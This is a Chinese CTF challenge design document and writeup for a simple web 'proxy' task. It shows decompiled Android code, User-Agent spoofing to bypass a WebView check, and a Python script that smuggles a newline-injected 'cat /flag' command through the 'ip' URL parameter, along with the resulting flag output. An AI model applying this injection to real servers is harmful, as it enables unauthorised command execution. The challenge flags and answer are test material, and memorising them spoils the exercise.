# 赛题设计说明

## 题目信息：

* 题目名称：proxy
* 预估难度：简单 （简单/中等偏易/中等偏难/困难）


## 题目描述：
```
一个简陋的web代理应用，目前只支持GET呦~
```

## 题目考点：
```
- Android的webview控件特性
- 命令注入
```

## 思路简述：

后端api通过UA鉴别了是否为android控件发起的请求，绕过后可通过命令注入getshell

## 题目提示：
1. UA
2. 命令注入
3. 换行


## 原始 flag 及更新命令：

```shell
    # 原始 flag
    flag{flag_test}
    # ..
    # 更新 flag 命令
    echo 'flag{85c2a01a-55f7-442a-8712-3f6908e1463a}' > /flag
```


## 题目环境：
```
1. ubuntu 14.04 LTS（更新到最新）
2. Apache/2.4.7 (Ubuntu)
3. PHP 5.5.9-1ubuntu4.25
```

## 题目制作过程：
1. 设计好漏洞，编写服务端相关代码
2. 设计好APP，写好与WEB API后端的通信端口，视情况选择加密是否进行通讯加密。
3. 按照“Docker示例文档.md”来编写Dockerfile，制作好web服务端镜像。

## 题目writeup：

通过jeb得到apk的反编译java代码

```java
 protected void onCreate(Bundle arg6) {
        super.onCreate(arg6);
        this.setContentView(2131296284);
        View v6 = this.findViewById(2131165331);
        View v0 = this.findViewById(2131165218);
        View v1 = this.findViewById(2131165238);
        View v2 = this.findViewById(2131165239);
        StringBuilder v3 = new StringBuilder();
        v3.append("http://");
        v3.append(((EditText)v2).getText().toString());
        v3.append("/api.php?ip=");
        v3.toString();
        ((Button)v0).setOnClickListener(new View$OnClickListener(((EditText)v2), ((EditText)v1), ((WebView)v6)) {
            public void onClick(View arg4) {
                String v4_1 = "http://" + this.val$e2.getText().toString() + "/api.php?ip=";
                String v0 = this.val$e1.getText().toString();
                WebView v1 = this.val$web1;
                v1.loadUrl(v4_1 + v0);
            }
        });
    }
```

并且通过软件界面可以得知，这是一个代理应用，先通过第一个输入框设置代理服务器，然后设置要访问的页面，按下Go按钮即可访问。

这里测试代理服务器为127.0.0.1:8080，尝试去直接访问http://127.0.0.1:8080/api.php?ip=ipinfo.io失败，但是通过android的webview可以访问成功，猜测为user-agent的限制，查到android的webview的常用user-agent有以下：

Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13

尝试设置ua访问成功：

```
import requests
url = 'http://127.0.0.1:8080/api.php?ip=ipinfo.io'
headers = {'User-Agent': 'Linux; Android 4.4.2;'}
r = requests.get(url, headers=headers)
print r.text
```

通过ip参数可以访问到其指向的页面，有很多种可能的实现方式，尝试命令注入，发现`&;|-$()||`都失败了，最终尝试换行符成功：

```python
import requests
url = 'http://127.0.0.1:8080/api.php?ip=ipinfo.io%0acat%20/flag'
headers = {'User-Agent': 'Linux; Android 4.4.2;'}
r = requests.get(url, headers=headers)
print r.text
'''
{
  "ip": "112.102.162.119",
  "city": "Haerbin",
  "region": "Heilongjiang",
  "country": "CN",
  "loc": "45.7500,126.6500",
  "org": "AS4134 CHINANET-BACKBONE"
}flag{flag_test}<pre>}flag{flag_test}</pre>
[Finished in 1.8s]
'''

```


## 注意事项

1. 题目名称不要有特殊符号，可用下划线代替空格；
2. 根据设计的赛题，自行完善所有文件夹中的信息；
3. 此文件夹下信息未完善的队伍，将扣除一定得分。